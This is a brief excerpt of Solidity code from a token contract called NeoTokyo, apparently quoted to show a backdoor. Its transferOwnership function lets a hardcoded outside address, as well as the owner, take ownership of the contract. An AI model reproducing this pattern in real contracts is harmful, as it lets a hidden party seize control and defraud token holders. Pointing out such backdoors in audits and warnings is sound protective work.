...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0x3CEbE5FFA937942fdDe031d523f2d1b440dEC4da));
...
contract NeoTokyo is Context, IERC20, Ownable, Pausable {
